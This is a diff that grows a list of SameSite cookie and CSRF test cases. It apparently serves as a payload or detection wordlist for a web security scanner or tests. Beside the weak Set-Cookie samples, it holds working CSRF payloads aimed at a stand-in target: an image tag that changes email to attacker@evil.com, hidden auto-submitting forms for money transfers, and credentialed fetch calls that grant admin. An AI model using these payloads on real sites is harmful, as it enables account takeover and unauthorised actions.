@@ -1,12 +1,101 @@
 Set-Cookie: session=abc123; SameSite=None
 Set-Cookie: session=abc123; SameSite=None; Secure
-Set-Cookie: session=abc123 (no SameSite)
+Set-Cookie: session=abc123
 Set-Cookie: auth=token; SameSite=Lax
 Set-Cookie: csrf_token=xyz; SameSite=Strict
 Set-Cookie: remember_me=1; SameSite=None
 Set-Cookie: user_id=1; SameSite=None; Secure; HttpOnly
+Set-Cookie: jwt=eyJ.xxx; SameSite=None
+Set-Cookie: access_token=xxx; SameSite=None; Secure
+Set-Cookie: refresh_token=xxx; SameSite=None
 POST /api/action (cross-origin with SameSite=None cookie)
 GET /profile?action=delete (CSRF via SameSite=Lax GET)
 <img src="https://target.com/api/change-email?email=attacker@evil.com">
 <form action="https://target.com/api/transfer" method="POST">
-fetch('https://target.com/api/admin', {credentials:'include'})
+fetch('https://target.com/api/admin',{credentials:'include'})
+<iframe src="https://target.com/api/logout">
+GET /api/delete?id=1 (SameSite=Lax allows GET-based CSRF)
+GET /api/export (SameSite=Lax, no state-changing protection)
+POST /api/settings (from cross-origin, SameSite=None)
+Origin: https://evil.com (SameSite=None bypass)
+Referer: https://evil.com/attack.html
+Set-Cookie: pref=dark; SameSite=None (tracking cookie)
+Set-Cookie: analytics=xxx; SameSite=None; Secure
+Set-Cookie: _ga=xxx; SameSite=None
+Set-Cookie: __utm=xxx; SameSite=None
+Set-Cookie: cart=xxx; SameSite=None; Secure
+Set-Cookie: checkout=xxx; SameSite=None
+Set-Cookie: order_id=1; SameSite=Lax
+Set-Cookie: payment_token=xxx; SameSite=None
+Set-Cookie: 2fa_session=xxx; SameSite=None; Secure
+Set-Cookie: sudo_token=xxx; SameSite=None
+<form method="POST" action="https://target.com/settings/email">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<form method="POST" action="https://target.com/api/transfer">
+  <input type="hidden" name="amount" value="1000">
+  <input type="hidden" name="to" value="attacker">
+</form>
+<script>document.forms[0].submit();</script>
+fetch('https://target.com/api/delete/1',{method:'POST',credentials:'include'})
+fetch('https://target.com/api/update',{method:'PUT',credentials:'include',body:JSON.stringify({role:'admin'})})
+GET /api/follow?user=attacker (SameSite=Lax allows GET)
+GET /api/add-friend?id=attacker
+GET /api/enable-feature?feature=debug
+GET /api/grant-permission?perm=admin
+GET /api/invite?email=attacker@evil.com
+GET /api/share?id=1&with=attacker
+GET /api/publish?post_id=1
+GET /api/unsubscribe-all
+GET /api/approve?id=1
+GET /api/revoke?id=1
+SameSite=None without Secure flag
+SameSite=Lax allows GET-based state change
+SameSite=Strict (reference - correct setting)
+Set-Cookie: remember=1; Expires=2030-01-01; SameSite=None
+Set-Cookie: stay_logged_in=1; Max-Age=31536000; SameSite=None
+Set-Cookie: device_token=xxx; SameSite=None; Secure; HttpOnly
+Set-Cookie: api_key=xxx; SameSite=None
+Set-Cookie: impersonation=xxx; SameSite=None; Secure
+Set-Cookie: sudo=1; SameSite=None
+Set-Cookie: mfa_verified=1; SameSite=None; Secure
+Set-Cookie: verified=true; SameSite=None
+Set-Cookie: role=admin; SameSite=None
+Set-Cookie: is_staff=1; SameSite=None; Secure
+Set-Cookie: is_superuser=1; SameSite=None; Secure; HttpOnly
+Set-Cookie: org_id=1; SameSite=None
+Set-Cookie: team=admins; SameSite=None; Secure
+Set-Cookie: subscription=premium; SameSite=None
+Set-Cookie: plan=enterprise; SameSite=None; Secure
+Set-Cookie: credits=999; SameSite=None
+Set-Cookie: balance=9999; SameSite=None; Secure
+Set-Cookie: discount_code=xxx; SameSite=None
+Set-Cookie: promo=xxx; SameSite=None; Secure
+Set-Cookie: referral=xxx; SameSite=None
+Set-Cookie: affiliate=xxx; SameSite=None; Secure
+Set-Cookie: coupon=xxx; SameSite=None
+Set-Cookie: loyalty_points=999; SameSite=None; Secure
+Set-Cookie: reward=xxx; SameSite=None
+Set-Cookie: gift_card=xxx; SameSite=None; Secure
+Set-Cookie: voucher=xxx; SameSite=None
+Set-Cookie: store_credit=999; SameSite=None; Secure
+Set-Cookie: account_type=premium; SameSite=None
+Set-Cookie: tier=gold; SameSite=None; Secure
+Set-Cookie: level=max; SameSite=None
+Set-Cookie: feature_flag=beta; SameSite=None; Secure
+Set-Cookie: ab_group=treatment; SameSite=None
+Set-Cookie: experiment=variant_b; SameSite=None; Secure
+Set-Cookie: override=1; SameSite=None
+Set-Cookie: bypass_check=1; SameSite=None; Secure
+Set-Cookie: skip_mfa=1; SameSite=None
+Set-Cookie: trusted_device=1; SameSite=None; Secure; HttpOnly
+Set-Cookie: remember_mfa=1; SameSite=None; Secure
+Set-Cookie: passkey_verified=1; SameSite=None; Secure; HttpOnly
+Set-Cookie: webauthn_session=xxx; SameSite=None; Secure; HttpOnly
+Set-Cookie: oauth_state=xxx; SameSite=None; Secure
+Set-Cookie: pkce_verifier=xxx; SameSite=None; Secure; HttpOnly
+Set-Cookie: nonce=xxx; SameSite=None; Secure
+Set-Cookie: auth_code=xxx; SameSite=None; Secure
+Set-Cookie: id_token=xxx; SameSite=None; Secure; HttpOnly
+Set-Cookie: access_token=xxx; SameSite=None; Secure; HttpOnly
+Set-Cookie: bearer=xxx; SameSite=None; Secure; HttpOnly
